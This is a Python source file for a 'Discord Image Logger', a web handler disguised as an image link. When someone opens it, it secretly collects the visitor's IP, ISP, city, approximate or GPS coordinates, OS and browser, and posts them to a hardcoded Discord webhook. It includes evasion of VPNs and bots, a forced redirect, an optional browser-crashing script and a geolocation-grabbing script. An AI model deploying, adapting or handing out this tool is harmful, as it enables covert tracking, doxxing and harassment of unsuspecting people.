# Formerly named "Discord Image Logger" (its a good name but I dont want to get my account flagged/suspended!!)
# By DeKrypt | https://github.com/dekrypted
# Remade by fishyramen, 99.9% of credit goes to DeKrypt, (he's a genius like me) all i did was fix it to work again | https://github.com/fishyramen
# If it don't work it might be because when switching false to true or true to false you have to make the first letter in caps like "False" or "True" or it won't work!!

from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "just an info collecting tool"
__version__ = "v1.0"
__author__ = "fishyramen"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1557549382109503613/vLbA7oUfExH44gcuLs0J80Bhgq3oKP53e-G-MRjsDZqcSKBUHh2WaHqAvY7_PNG4CTHM",
    "image": "https://images.teepublic.com/derived/production/designs/3602861_0/1543437730/i_m:pid_477,c_76_112_1108x1108,bc_ffffff,ar_1x1,o_landscape,pm_4,s_630,q_90.jpg", # You can also have a custom image

    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "snatch blue", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://bigrat.monster/" # Link to the webpage to redirect to
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent or "")

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp') if info.get('isp') else 'Unknown'}`
> **ASN:** `{info.get('as') if info.get('as') else 'Unknown'}`
> **Country:** `{info.get('country') if info.get('country') else 'Unknown'}`
> **Region:** `{info.get('regionName') if info.get('regionName') else 'Unknown'}`
> **City:** `{info.get('city') if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/{str(info.get("lat"))},{str(info.get("lon"))})'})
> **Timezone:** `{info.get('timezone','').split('/')[1].replace('_', ' ')} ({info.get('timezone','').split('/')[0]})`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info


binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)A|Ns;0|JwkF0)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|#qM810'),
}


def _get_ip(request):
    headers = getattr(request, "headers", {})
    if hasattr(headers, "get"):
        value = headers.get("x-forwarded-for") or headers.get("X-Forwarded-For") or headers.get("cf-connecting-ip")
        if value:
            return value.split(",")[0].strip()
    return getattr(request, "remote_addr", "Unknown") or "Unknown"


def _get_query(request):
    if hasattr(request, "query") and isinstance(request.query, dict):
        return request.query
    raw = getattr(request, "url", "/") or "/"
    return dict(parse.parse_qsl(parse.urlsplit(raw).query))


def _response(status=200, body="", content_type="text/html", headers=None, is_base64=False):
    resp = {
        "statusCode": status,
        "headers": {"Content-Type": content_type},
        "body": body,
        "isBase64Encoded": is_base64,
    }
    if headers:
        resp["headers"].update(headers)
    return resp


def handler(request):
    try:
        headers = getattr(request, "headers", {})
        ip = _get_ip(request)
        useragent = headers.get("user-agent", "") if hasattr(headers, "get") else ""
        query = _get_query(request)
        path = parse.urlsplit(getattr(request, "url", "/") or "/").path or "/"

        if config["imageArgument"]:
            if query.get("url") or query.get("id"):
                value = query.get("url") or query.get("id")
                if isinstance(value, list):
                    value = value[0]
                if value and value.startswith("http"):
                    url = value
                else:
                    url = base64.b64decode(value.encode()).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        if isinstance(ip, str) and ip.startswith(blacklistedIPs):
            return _response(200, "Blocked", "text/plain")

        if botCheck(ip, useragent):
            if config["buggedImage"]:
                return _response(
                    200,
                    base64.b64encode(binaries["loading"]).decode("utf-8"),
                    "image/jpeg",
                    is_base64=True,
                )
            return _response(302, "", "text/plain", {"Location": url})

        result = makeReport(ip, useragent, endpoint=path, url=url)
        message = config["message"]["message"]

        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp", "Unknown"))
            message = message.replace("{asn}", result.get("as", "Unknown"))
            message = message.replace("{country}", result.get("country", "Unknown"))
            message = message.replace("{region}", result.get("regionName", "Unknown"))
            message = message.replace("{city}", result.get("city", "Unknown"))
            message = message.replace("{lat}", str(result.get("lat", "Unknown")))
            message = message.replace("{long}", str(result.get("lon", "Unknown")))
            message = message.replace("{timezone}", f"{result.get('timezone', '').split('/')[1].replace('_', ' ')} ({result.get('timezone', '').split('/')[0]})")
            message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
            message = message.replace("{vpn}", str(result.get("proxy", "False")))
            message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            browser_name = httpagentparser.simple_detect(useragent)[1]
            os_name = httpagentparser.simple_detect(useragent)[0]
            message = message.replace("{browser}", browser_name)
            message = message.replace("{os}", os_name)

        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

        if config["message"]["doMessage"]:
            data = message.encode()

        if config["crashBrowser"]:
            data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

        if config["accurateLocation"]:
            data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""

        return _response(200, data.decode("latin1"), "text/html")

    except Exception:
        reportError(traceback.format_exc())
        return _response(500, "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.", "text/html")
